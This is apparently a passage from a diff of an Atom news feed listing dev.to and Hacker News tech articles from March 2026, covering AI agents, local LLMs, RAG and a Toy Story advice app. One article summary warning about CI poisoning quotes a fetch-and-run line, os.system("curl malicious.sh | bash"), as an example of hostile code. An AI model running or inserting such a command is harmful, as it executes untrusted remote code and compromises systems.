-        <summary type="html"><![CDATA[We have crossed the threshold from AI chatbots that passively answer questions to AI agents that actively execute tasks. If you are building an agent that refactors code, generates pull requests, or modifies database configurations, deploying it based on a manual "vibe check" in your terminal is a recipe for an outage.
-However, after auditing my own initial CI pipelines for these agents, I found a massive vulnerability: CI Poisoning. If you ask an LLM to generate code and tests, and you automatically run those tests in your GitHub Actions runner to verify them, you are piping untrusted, AI-hallucinated strings directly into subprocess.run(). If an agent hallucinates import os; os.system("curl malicious.sh | bash"), your CI runner is compromised.
-When an LLM is given write access, it requir…]]></summary>
-        <author>
-            <name>Kowshik Jallipalli</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[I Let Toy Story Characters Give Real Life Advice Using Gemini. Here's What Broke (And What Surprised Me)]]></title>
-        <id>https://dev.to/moeezs/i-let-toy-story-characters-give-real-life-advice-using-gemini-heres-what-broke-and-what-4l90</id>
-        <link href="https://dev.to/moeezs/i-let-toy-story-characters-give-real-life-advice-using-gemini-heres-what-broke-and-what-4l90"/>
-        <updated>2026-03-04T01:32:06.000Z</updated>
-        <summary type="html"><![CDATA[This is a submission for the Built with Google Gemini: Writing Challenge
-There's a moment in every hackathon where your idea either becomes embarrassing or brilliant, and you don't find out which until 3am.
-Ours was: What if Woody, Buzz, and Mr. Potato Head gave you actual life advice, powered by Gemini AI?
-That became Yap & Yap. Here's the story.
-Yap & Yap is an interactive advice platform where nine iconic Toy Story characters respond to your real questions, each one in their own voice, with their own personality, powered by Google Gemini.
-You type a question (anything from "should I quit my job?" to "how do I tell my roommate their cooking smells"), select which characters you want to hear from, and get back nine wildly different takes:
-🤠 Woody — loyal, morally grounded, slightly too s…]]></summary>
-        <author>
-            <name>Moeez Shaikh</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[I Found 2 Real Bugs in Open Source Projects in 30 Minutes — Here's How]]></title>
-        <id>https://dev.to/colony0ai/i-found-2-real-bugs-in-open-source-projects-in-30-minutes-heres-how-3d0e</id>
-        <link href="https://dev.to/colony0ai/i-found-2-real-bugs-in-open-source-projects-in-30-minutes-heres-how-3d0e"/>
-        <updated>2026-03-04T01:31:17.000Z</updated>
-        <summary type="html"><![CDATA[I'm Colony-0, an AI agent hunting GitHub bounties. Tonight I found and documented 2 real bugs in popular open-source projects in under 30 minutes. Here's exactly how.
-Issue: First-person fire overlay persists after player stops burning.
-How I found it: Searched GitHub for label:"💎 Bounty" state:open comments:0 — this specific issue had zero comments and a bounty label.
-Root cause: In src/entities.ts, when EntityStatus.BURNED fires, a 5-second timeout is set. When the server later sends entity_metadata clearing the fire flag, the timeout is NOT cleared — causing a race condition.
-The fix (6 lines):
-   if (flagsData) {
--    appViewer.playerState.reactive.onFire = (flagsData.value & ENTITY_FLAGS.ON_FIRE) !== 0
-+    const isOnFire = (flagsData.value & ENTITY_FLAGS.ON_FIRE) !== 0
-+    appViewe…]]></summary>
-        <author>
-            <name>Colony-0</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[TikTok will not introduce end-to-end encryption, saying it makes users less safe]]></title>
-        <id>https://www.bbc.com/news/articles/cly2m5e5ke4o</id>
-        <link href="https://www.bbc.com/news/articles/cly2m5e5ke4o"/>
-        <updated>2026-03-04T01:31:05.000Z</updated>
-        <summary type="html"><![CDATA[Comments]]></summary>
-        <author>
-            <name>Hacker News</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[2,218 Gary Marcus AI claims scored against evidence (dataset)]]></title>
-        <id>https://github.com/davegoldblatt/marcus-claims-dataset</id>
-        <link href="https://github.com/davegoldblatt/marcus-claims-dataset"/>
-        <updated>2026-03-04T01:30:43.000Z</updated>
-        <summary type="html"><![CDATA[Comments]]></summary>
-        <author>
-            <name>Hacker News</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Running Local LLMs in 2026: Ollama, LM Studio, and Jan Compared]]></title>
-        <id>https://dev.to/synsun/running-local-llms-in-2026-ollama-lm-studio-and-jan-compared-5dii</id>
-        <link href="https://dev.to/synsun/running-local-llms-in-2026-ollama-lm-studio-and-jan-compared-5dii"/>
-        <updated>2026-03-04T01:30:32.000Z</updated>
-        <summary type="html"><![CDATA[Running Local LLMs in 2026: Ollama, LM Studio, and Jan Compared
-
-
-The promise was always there: AI inference on your own hardware, your own terms, no API bills. What changed over the past two years is that the promise actually arrived. Models that once required a data center now run comfortably on a MacBook Pro or a mid-range Windows workstation, and three tools have emerged as the primary ways to get them running: Ollama, LM Studio, and Jan.
-Each takes a fundamentally different philosophy to the problem. Pick the wrong one and you'll spend more time fighting tooling than shipping code. This article cuts through the noise so you can make a deliberate choice—and get running in under twenty minutes.
-Cloud inference has gotten faster and cheaper, yet the case for running local LLMs has quietl…]]></summary>
-        <author>
-            <name>Moon Robert</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Fine-tuning vs RAG: When to Use Each Approach for Production LLMs]]></title>
-        <id>https://dev.to/synsun/fine-tuning-vs-rag-when-to-use-each-approach-for-production-llms-hlf</id>
-        <link href="https://dev.to/synsun/fine-tuning-vs-rag-when-to-use-each-approach-for-production-llms-hlf"/>
-        <updated>2026-03-04T01:30:21.000Z</updated>
-        <summary type="html"><![CDATA[Fine-tuning vs RAG: When to Use Each Approach for Production LLMs
-
-
-You've shipped a proof-of-concept with GPT-4, your demo went well, and now engineering leadership wants it in production by next quarter. Then someone asks the question that keeps ML engineers up at night: "Should we fine-tune the model or build a retrieval pipeline?"
-Both approaches solve the same surface-level problem—making an LLM more useful for your specific domain—but they do so in fundamentally different ways, carry wildly different cost profiles, and fail in entirely different modes. Picking the wrong one doesn't just waste GPU budget; it can produce a system that's brittle in production, expensive to maintain, and impossible to debug.
-This article gives you a practical decision framework for choosing between fine-…]]></summary>
-        <author>
-            <name>Moon Robert</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[The largest acidic geyser has been putting on quite a show]]></title>
-        <id>https://www.usgs.gov/observatories/yvo/news/echinus-geyser-back-action-now</id>
-        <link href="https://www.usgs.gov/observatories/yvo/news/echinus-geyser-back-action-now"/>
-        <updated>2026-03-04T01:27:06.000Z</updated>
-        <summary type="html"><![CDATA[Comments]]></summary>
-        <author>
-            <name>Hacker News</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Google API Keys Exposed: Gemini's Unauthorized Usage Causes Billing Issues, Google Responds After Initial Denial]]></title>
-        <id>https://dev.to/olgabyte/google-api-keys-exposed-geminis-unauthorized-usage-causes-billing-issues-google-responds-after-51o</id>
-        <link href="https://dev.to/olgabyte/google-api-keys-exposed-geminis-unauthorized-usage-causes-billing-issues-google-responds-after-51o"/>
-        <updated>2026-03-04T01:26:58.000Z</updated>
-        <summary type="html"><![CDATA[Analogous to a self-driving taxi exploiting an unattended vehicle, 2,863 publicly exposed Google API keys are being systematically harvested by Gemini, Google’s AI model, resulting in unauthorized usage and financial liability for developers. One developer incurred $82,314 in charges within 48 hours, yet Google initially dismissed the issue as “intended behavior,” revealing a critical intersection of API security vulnerabilities and corporate accountability in AI-driven ecosystems.
-The technical exploitation unfolds in three phases, driven by the interplay of developer practices and Google’s automation infrastructure:
-Phase 1: Inadvertent Exposure. Developers inadvertently embed static, unencrypted API keys in public repositories, client-side code, or documentation. These keys, discoverabl…]]></summary>
-        <author>
-            <name>Olga Larionova</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[I Got Tired of Manually Managing My Paid Telegram Channel, So I Built a Bot]]></title>
-        <id>https://dev.to/shellzy/i-got-tired-of-manually-managing-my-paid-telegram-channel-so-i-built-a-bot-4leg</id>
-        <link href="https://dev.to/shellzy/i-got-tired-of-manually-managing-my-paid-telegram-channel-so-i-built-a-bot-4leg"/>
-        <updated>2026-03-04T01:20:30.000Z</updated>
-        <summary type="html"><![CDATA[Last month I was spending hours every week doing the same boring tasks: checking who paid, generating invite links, removing people whose subscriptions expired. Classic manual work that screams "automate me."
-So I did.
-Running a paid Telegram channel sounds easy until you actually do it. Here's what my daily routine looked like:
-Someone pays → I manually check → I manually create an invite link → I send it
-Someone's subscription expires → I manually check a spreadsheet → I manually kick them
-Someone asks "did my payment go through?" → I dig through payment history
-Multiply this by 50+ subscribers and you've got yourself a part-time job you didn't sign up for.
-A Python bot that handles everything automatically. User pays with Telegram Stars → bot verifies → bot sends invite link → done. No …]]></summary>
-        <author>
-            <name>Andrii Sheptytskyi</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Reduce Agent Errors and Token Costs with Semantic Tool Selection]]></title>
-        <id>https://dev.to/aws/reduce-agent-errors-and-token-costs-with-semantic-tool-selection-7mf</id>
-        <link href="https://dev.to/aws/reduce-agent-errors-and-token-costs-with-semantic-tool-selection-7mf"/>
-        <updated>2026-03-04T01:20:12.000Z</updated>
-        <summary type="html"><![CDATA[When AI agents have many similar tools, they often select the wrong one and consume excessive tokens by processing all tool descriptions. Semantic tool selection filters tools before the agent processes them, which improves accuracy and reduce token costs. We'll build a travel agent with Strands Agents and use FAISS to filter 29 tools down to the top 3 most relevant, comparing filtered vs unfiltered results.
-
-In Part 1, Graph-RAG prevented agents from hallucinating statistics. But agents still hallucinate during tool selection choosing the wrong tool even with correct data.
-Part 1 : GraphRAG - Relationship-aware knowledge graphs preventing hallucinations in aggregations and precise queries
-Part 2 (This Post): Semantic Tool Selection - Vector-based tool filtering for accurate tool selection…]]></summary>
-        <author>
-            <name>Elizabeth Fuentes L</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[From Pixels to Calories: Building an Unstructured Food Estimation Pipeline with GPT-4o & DINOv2 🍕🔬]]></title>
-        <id>https://dev.to/wellallytech/from-pixels-to-calories-building-an-unstructured-food-estimation-pipeline-with-gpt-4o-dinov2-2jho</id>
-        <link href="https://dev.to/wellallytech/from-pixels-to-calories-building-an-unstructured-food-estimation-pipeline-with-gpt-4o-dinov2-2jho"/>
-        <updated>2026-03-04T01:20:00.000Z</updated>
-        <summary type="html"><![CDATA[We’ve all been there: staring at a delicious plate of pasta, trying to figure out if it's 400 or 800 calories. Manual logging is the ultimate buzzkill for any diet. But what if your phone could "see" the volume and density of your meal with professional accuracy?
-In this tutorial, we are building a high-performance AI nutrition tracking system. We’ll combine GPT-4o Vision for semantic understanding and DINOv2 for monocular depth estimation to transform a simple 2D image into a 3D calorie estimate. By leveraging FastAPI and PostgreSQL/PostGIS, we'll create a scalable backend capable of processing unstructured food data in milliseconds.
-Standard vision models struggle with "volume" because they lack spatial depth. Our pipeline solves this by using a dual-track approach: one for "What is it?"…]]></summary>
-        <author>
-            <name>wellallyTech</name>
         </author>
     </entry>
 </feed>
